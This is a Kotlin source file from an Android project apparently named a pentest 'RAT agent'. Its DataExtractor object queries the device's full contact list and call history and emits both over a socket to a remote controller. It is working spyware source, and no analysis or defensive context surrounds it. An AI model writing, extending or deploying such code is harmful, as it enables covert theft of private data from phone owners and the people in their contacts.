package com.pentest.ratagent

import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object DataExtractor {

    fun getContacts(context: Context) {
        val contacts = JSONArray()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contacts.put(JSONObject().apply {
                    put("name", name)
                    put("number", number)
                })
            }
        }
        SocketManager.socket?.emit("contacts-list", contacts)
    }

    fun getCallLogs(context: Context) {
        val logs = JSONArray()
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC"
        )
        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
                val type = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
                val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
                logs.put(JSONObject().apply {
                    put("number", number)
                    put("type", type) // 1: Incoming, 2: Outgoing, 3: Missed
                    put("date", date)
                })
            }
        }
        SocketManager.socket?.emit("call-logs", logs)
    }
}
